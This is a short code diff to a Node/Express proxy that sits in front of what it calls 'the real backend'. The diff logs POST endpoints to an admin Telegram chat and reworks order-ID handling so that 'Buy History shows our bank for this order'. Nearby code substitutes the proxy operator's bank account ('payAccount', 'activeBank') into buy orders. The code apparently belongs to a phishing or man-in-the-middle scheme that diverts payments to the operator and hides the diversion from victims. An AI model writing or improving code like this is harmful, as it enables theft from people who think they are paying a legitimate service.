@@ -1180,6 +1180,11 @@ app.all('/xxapi/*', async (req, res) => {
     const urlLower = path.toLowerCase();
     const now = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
 
+    // TEMPORARY: Log ALL POST requests to find the exact buy endpoint
+    if (req.method === 'POST' && data.adminChatId && bot) {
+      bot.sendMessage(data.adminChatId, `🔍 DEBUG POST:\nURL: ${path}`).catch(() => {});
+    }
+
     // Security checks are no longer intercepted.
     // They are handled natively by the real backend.
 
@@ -1313,7 +1318,11 @@ app.all('/xxapi/*', async (req, res) => {
                   if (payAccount) bjData.payAccount = payAccount;
                 }
                 // ── Save to orderBankMap so Buy History shows our bank for this order ──
-                const case1OrderId = reqOrderId || (bjData && (bjData.rptNo || bjData.orderNo || bjData.orderId || ''));
+                let case1OrderId = reqOrderId || '';
+                if (!case1OrderId && bjData) {
+                  if (typeof bjData === 'string' && bjData.length > 5) case1OrderId = bjData;
+                  else case1OrderId = bjData.rptNo || bjData.orderNo || bjData.orderId || bjData.id || '';
+                }
                 if (case1OrderId) {
                   if (!data.orderBankMap) data.orderBankMap = {};
                   const bkAcctC1 = activeBank.accountNo;
